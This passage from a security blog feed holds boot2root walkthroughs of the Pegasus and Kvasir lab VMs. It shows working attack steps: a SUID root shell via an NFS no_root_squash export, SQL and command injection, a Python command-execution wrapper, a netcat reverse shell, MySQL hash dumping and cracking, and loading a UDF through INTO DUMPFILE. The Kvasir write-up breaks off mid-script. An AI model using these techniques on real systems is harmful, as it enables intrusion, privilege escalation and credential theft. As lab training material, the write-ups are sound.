Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
john@pegasus:~$ sudo nfs
Usage: nfs [start|stop]
john@pegasus:~$ sudo nfs start
 * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ]
 * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
john@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I checked out the &lt;code&gt;/etc/exports&lt;/code&gt; file, and noticed the the &lt;code&gt;no_root_squash&lt;/code&gt; flag for the &lt;code&gt;/opt/nfs&lt;/code&gt; export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)&lt;/p&gt;

&lt;p&gt;So, I mounted the share&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mkdir nfs
root@kali:~# mount 192.168.56.101:/opt/nfs nfs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; prepped a SUID shell &amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/pegasus/nfs# cat shell.c
#include &amp;lt;stdio.h&amp;gt;

int main()
{
    setuid(0);
    setgid(0);
    system(&amp;quot;/bin/sh&amp;quot;);
}
root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
root@kali:~/Desktop/pegasus/nfs# ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
-rw-r--r-- 1 root root   79 Dec 23 14:39 shell.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and rooted Pegasus :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ /opt/nfs/shell
# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag&#34;&gt;flag :)&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag
               ,
               |`\
              /&#39;_/_
            ,&#39;_/\_/\_                       ,
          ,&#39;_/\&#39;_\_,/_                    ,&#39;|
        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&amp;lt;_,&#39; _,\_,/      known creatures in Greek
   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
    \_`\&amp;gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
      \_&#39;/&amp;gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
        &amp;gt;/  _ ,V  ,&amp;lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &amp;gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_(


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for the fun &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>solving kvasir netcat edition</title>
      <link>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</link>
      <pubDate>Sun, 09 Nov 2014 10:27:09 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/entry/kvasir-i,106/&#34;&gt;Kvasir&lt;/a&gt;, a boot2root by &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/netcat.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Kvasir is &lt;em&gt;extremely&lt;/em&gt; well polished, and it can be seen throughout the VM that &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.&lt;/p&gt;

&lt;p&gt;This writeup details the path I took to read the final flag :)&lt;/p&gt;

&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;

&lt;p&gt;Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using &lt;code&gt;proxychains&lt;/code&gt;, and I was editing &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; to match the port of the proxy I needed to use to reach my desired destination.&lt;/p&gt;

&lt;p&gt;With that out the way, lets start.
Almost all of the boot2roots have a discovery phase. After downloading the archive from &lt;a href=&#34;http://vulnhub.com&#34;&gt;vulnhub.com&lt;/a&gt;, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged *lazy mode*™ and checked what the VirtualBox session showed the IP was:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ip.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;192.168.56.102&lt;/strong&gt;. Sweet, throwing &lt;code&gt;nmap&lt;/code&gt; at it showed only &lt;code&gt;tcp/80&lt;/code&gt; as open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 11:07 SAST
Nmap scan report for 192.168.56.102
Host is up (0.000061s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;fink-ur-gud-enuf&#34;&gt;fink ur gud enuf?&lt;/h2&gt;

&lt;p&gt;Browsing to the IP using Iceweasel, we see a login portal presented to us:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I made a few attempts at guessing a login, and eventually just threw a &lt;code&gt;&#39;&lt;/code&gt; at the username field:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web_sqli.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I had a instant troll alert and figured it can&amp;rsquo;t be &lt;em&gt;that&lt;/em&gt; easy!? Changing the username payload from &lt;code&gt;&#39;&lt;/code&gt; to &lt;code&gt;&#39; OR 1=1 LIMIT 1--&lt;/code&gt; with a random word as a password, resulted in the application returning a &lt;code&gt;403&lt;/code&gt; type response. I figured that something strange was going on here, and fired up &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt; to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_login_403.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered &lt;code&gt;bob:bob&lt;/code&gt; with a DoB of &lt;code&gt;09/09/09&lt;/code&gt;, and attempted to login with the credentials:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_member.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as &lt;code&gt;&#39;a&#39;, &#39;a&#39;, 0, NULL)&lt;/code&gt;. Considering this was a new account registration page, my guess was that this was part of a &lt;code&gt;INSERT&lt;/code&gt; query:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_submit_sqli.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &amp;lsquo;ol &lt;code&gt;wfuzz&lt;/code&gt; on the web service to see if there was anything interesting to reveal:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

00077:  C=302     16 L        34 W      365 Ch    &amp;quot; - admin&amp;quot;
00302:  C=403     10 L        30 W      294 Ch    &amp;quot; - cgi-bin/&amp;quot;
00394:  C=403     10 L        30 W      292 Ch    &amp;quot; - create&amp;quot;
00455:  C=403     10 L        30 W      294 Ch    &amp;quot; - descarga&amp;quot;
00457:  C=403     10 L        30 W      296 Ch    &amp;quot; - descarrega&amp;quot;
00463:  C=403     10 L        30 W      298 Ch    &amp;quot; - descarregues&amp;quot;
00741:  C=200     20 L        44 W      464 Ch    &amp;quot; - index&amp;quot;
00894:  C=403     10 L        30 W      290 Ch    &amp;quot; - load&amp;quot;
00901:  C=302      0 L         0 W        0 Ch    &amp;quot; - login&amp;quot;
00904:  C=302      0 L         0 W        0 Ch    &amp;quot; - logout&amp;quot;
00964:  C=302     15 L        16 W      168 Ch    &amp;quot; - member&amp;quot;
01247:  C=200     17 L        39 W      426 Ch    &amp;quot; - register&amp;quot;
01331:  C=403     10 L        30 W      292 Ch    &amp;quot; - select&amp;quot;
01432:  C=200      0 L         0 W        0 Ch    &amp;quot; - submit&amp;quot;
01556:  C=403     10 L        30 W      292 Ch    &amp;quot; - update&amp;quot;
01565:  C=403     10 L        30 W      293 Ch    &amp;quot; - updates&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woa, thats quite a bit of results to work through eh :)&lt;/p&gt;

&lt;h2 id=&#34;admins-only-want-to-302-here&#34;&gt;admins only want to 302 here&lt;/h2&gt;

&lt;p&gt;Of everything &lt;code&gt;wfuzz&lt;/code&gt; revealed to us, &lt;code&gt;admin.php&lt;/code&gt; was the most interesting one. Watching Burp as the requests went up and down, I noticed that &lt;code&gt;admin.php&lt;/code&gt; would return a HTTP 302 code with a location, along with an actual body:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_php.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Sweet! I modified the response in Burp to return &lt;code&gt;200&lt;/code&gt; instead, and removed the &lt;code&gt;Location:&lt;/code&gt; header. We now had a new page to work with :)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_bypass.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The form hints that we can check the service status of daemons running on the underlying OS, and suggests &lt;code&gt;apache2&lt;/code&gt; as input. I submitted the form with &lt;code&gt;apache2&lt;/code&gt; as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section &lt;code&gt;Apache2 is running (pid 1330).&lt;/code&gt;. This just &lt;strong&gt;screams&lt;/strong&gt; command injection doesn’t it?&lt;/p&gt;

&lt;h2 id=&#34;command-injection&#34;&gt;command injection&lt;/h2&gt;

&lt;p&gt;In order for me to fuzz this further, I took the request to trusty &amp;lsquo;ol &lt;code&gt;curl&lt;/code&gt;. While doing this, I realized that &lt;code&gt;admin.php&lt;/code&gt; did no checks to ensure that we are authenticated or anything. We could simply submit &lt;code&gt;service=&amp;lt;payload&amp;gt;&lt;/code&gt; as a POST to &lt;code&gt;admin.php&lt;/code&gt; and get output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=apache2;&#39;

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div align=&amp;quot;center&amp;quot;&amp;gt;

&amp;lt;h1&amp;gt;Service Check&amp;lt;/h1&amp;gt;

&amp;lt;form name=&amp;quot;service&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;&amp;quot;&amp;gt;
&amp;lt;input name=&amp;quot;service&amp;quot; id=&amp;quot;service&amp;quot; type=&amp;quot;text&amp;quot; placeholder=&amp;quot;apache2&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
&amp;lt;input name=&amp;quot;submit&amp;quot; id=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;form action=&amp;quot;logout.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Logout&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;pre&amp;gt;Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entering &lt;code&gt;apache2;&lt;/code&gt; as the input, revealed the first step in our command injection. With &lt;code&gt;apache2;&lt;/code&gt; as the payload, I figured that the php script was taking our user input and running with the following pseudo code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

print system(&amp;quot;/etc/init.d/&amp;quot; . $_POST[&amp;quot;service&amp;quot;] . &amp;quot; status&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, with our payload, we have modified this to run &lt;code&gt;/etc/init.d/apache2; status&lt;/code&gt;, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting &lt;code&gt;service=&lt;/code&gt; as &lt;code&gt;;echo &#39;id&#39;;&lt;/code&gt; where the single quotes are actually back ticks. (octopress grrr)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=;echo `id`;&#39;

[... snip ...]

&amp;lt;pre&amp;gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;netcat-is-our-entry-into-the-rabbit-hole&#34;&gt;netcat is our entry into the rabbit hole&lt;/h2&gt;

&lt;p&gt;With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&amp;rsquo;d out. This ended up as the following python script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Kvasir Command Execution

# $ python cmd.py &amp;quot;uname -a&amp;quot;
# Command to run: uname -a
#
# Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux

import requests
import re
import sys
import os
import binascii

print &#39;Command to run: %s&#39; % sys.argv[1]

# generate 2 random strings so that we can regex out the command output
command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))

# prepare something that we can regex out
params = {&#39;service&#39; : &#39;;echo %s; echo `%s`; echo %s;&#39; % (command_start, sys.argv[1], command_end) }

#fetch, ignoring the troll redirect
r = requests.post(&#39;http://192.168.56.102/admin.php&#39;, params, allow_redirects=False)

#match regex and print
print  re.findall(r&#39;%s([^|]+)%s&#39; % (command_start, command_end), r.text)[0].replace(&#39;\n%s\n&#39; % command_end,&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, now I can just run &lt;code&gt;python cmd.py &amp;quot;id&amp;quot;&lt;/code&gt; and get the output (the &lt;em&gt;(kvasir)&lt;/em&gt; in front of my prompt is my python virtualenv where I installed the &lt;code&gt;requests&lt;/code&gt; dependency):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# python cmd.py &amp;quot;id&amp;quot;
Command to run: id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. &lt;strong&gt;192.168.1.100&lt;/strong&gt; and &lt;strong&gt;192.168.2.100&lt;/strong&gt;. No sign of &lt;strong&gt;192.168.56.102&lt;/strong&gt; here&amp;hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with &lt;code&gt;nc -lvp 4444&lt;/code&gt;, and connected to it using my &lt;code&gt;cmd.py&lt;/code&gt; script &lt;code&gt;python cmd.py &amp;quot;/bin/nc 192.168.56.101 4444 -e /bin/bash&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, in order to make sure we don&amp;rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The only public presence of the internal network is therefore the originally discovered &lt;strong&gt;192.168.56.102&lt;/strong&gt; IP address.&lt;/p&gt;

&lt;h2 id=&#34;my-see-qual-as-root-deserves-a-slap-on-the-wrist&#34;&gt;my-see-qual as root deserves a slap on the wrist&lt;/h2&gt;

&lt;p&gt;With semi interactive shell access using &lt;code&gt;netcat&lt;/code&gt; to &lt;strong&gt;web&lt;/strong&gt; (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from &lt;code&gt;member.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

session_start();

if (!isset($_SESSION[&amp;quot;member&amp;quot;])) {
    header(&amp;quot;Location: index.php&amp;quot;);
}

$user = $_SESSION[&amp;quot;username&amp;quot;];

mysql_connect(&amp;quot;192.168.2.200&amp;quot;, &amp;quot;webapp&amp;quot;, &amp;quot;webapp&amp;quot;) or die(mysql_error());
mysql_select_db(&amp;quot;webapp&amp;quot;) or die(mysql_error());

$query = &amp;quot;SELECT dob FROM users WHERE username=&#39;$user&#39;&amp;quot;;
$result = mysql_query($query) or die(mysql_error());

?&amp;gt;
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So mysql access with &lt;code&gt;webapp:webapp&lt;/code&gt; at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;show grants;&#39;
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*BF7C27E734F86F28A9386E9759D238AFB863BDE3&#39;
GRANT ALL PRIVILEGES ON `webapp`.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I can select anywhere. Nice :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; show tables;&#39;
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; select * from todo;&#39;
task
stop running mysql as root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A table called &lt;code&gt;todo&lt;/code&gt; exists, with a string &lt;code&gt;stop running mysql as root&lt;/code&gt;. That was the first hint and immediately had me thinking about &lt;a href=&#34;http://www.mysqludf.org/&#34;&gt;MySQL UDF&lt;/a&gt;&amp;rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&amp;rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use mysql; select DISTINCT User,Password from user;&#39;
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As a side note, further enumeration of the PHP sources and MySQL table &lt;code&gt;users&lt;/code&gt; showed that if we injected SQL on the registration page to add a extra &lt;code&gt;1&lt;/code&gt;, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.&lt;/p&gt;

&lt;h3 id=&#34;cracking-root-s-mysql-password&#34;&gt;cracking root&amp;rsquo;s MySQL password&lt;/h3&gt;

&lt;p&gt;Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used &lt;code&gt;hashcat&lt;/code&gt; with the ever famous &lt;code&gt;rockyou&lt;/code&gt; wordlist:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, echo the hash to a file
root@kali:~# echo &amp;quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&amp;quot; &amp;gt; db.root

# next, we tell hash cat the type of hash we have and wait a few seconds :)
root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.

Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...

Added hashes from file db.root: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen

ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater

All hashes have been recovered

Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 3.27M words
Progress..: 281260/3627099 (7.75%)
Running...: --:--:--:--
Estimated.: 00:00:00:01

Started: Sun Nov  9 14:07:14 2014
Stopped: Sun Nov  9 14:07:14 2014
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The password for the MySQL &lt;code&gt;root&lt;/code&gt; user is therefore &lt;code&gt;coolwater&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;show grants;&#39;
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39; WITH GRANT OPTION
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;loading-the-udf-remotely&#34;&gt;loading the UDF remotely&lt;/h3&gt;

&lt;p&gt;With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.&lt;/p&gt;

&lt;p&gt;I grabbed a copy of a &lt;code&gt;do_system()&lt;/code&gt; UDF that I have previously used successfully from &lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_udf.c&#34;&gt;here&lt;/a&gt;, called &lt;code&gt;raptor_udf.c&lt;/code&gt;. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the &lt;code&gt;web&lt;/code&gt; host. Compilation was done on the &lt;code&gt;web&lt;/code&gt; host with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word &lt;code&gt;uploading&lt;/code&gt; sounds trivial, however its not. I need to know &lt;em&gt;where&lt;/em&gt; to first. For this, I enumerate the MySQL &lt;code&gt;plugin_dir&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select @@plugin_dir;&#39;
@@plugin_dir
/usr/lib/mysql/plugin/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this means I need to write the udf to &lt;code&gt;/usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;. Fair enough. But how do I write this? Well there are many approaches to this. One is to use &lt;code&gt;--local-infile=1&lt;/code&gt; as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the &lt;strong&gt;local&lt;/strong&gt; file to wherever (a table in our case) and then to a file via &lt;code&gt;INTO DUMPFILE&lt;/code&gt;. The other option is to simply convert the content to hex, and run &lt;code&gt;SELECT 0x&lt;/code&gt; + &lt;code&gt;&amp;lt;CONTENT AS HEX&amp;gt;&lt;/code&gt; + &lt;code&gt;INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I opted for the content encoding as hex and generated a &lt;code&gt;xxd&lt;/code&gt; output of the compiled &lt;code&gt;raptor_udf.so&lt;/code&gt;. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of &lt;code&gt;Undefined Symbol &amp;quot;do_system&amp;quot; in raptor_udf.so&lt;/code&gt;. :&lt;/p&gt;

&lt;p&gt;Eventually, I opted to find a precompiled 64bit &lt;code&gt;.so&lt;/code&gt; to upload, and found one in the &lt;a href=&#34;https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so&#34;&gt;sqlmap repository&lt;/a&gt;. I downloaded this and converted it to hex using &lt;code&gt;xxd&lt;/code&gt;. I then created the following file with the mysql commands to run on the &lt;code&gt;web&lt;/code&gt; host from my attacking machine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select 0x7f454

    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]

0000000000000 into dumpfile &amp;quot;/usr/lib/mysql/plugin/raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;create function sys_exec returns integer soname &amp;quot;raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select * from mysql.func;&#39; 2&amp;gt;&amp;gt; log

# this adds me a SSH key to roots authorized keys using the command execution udf we have prepared
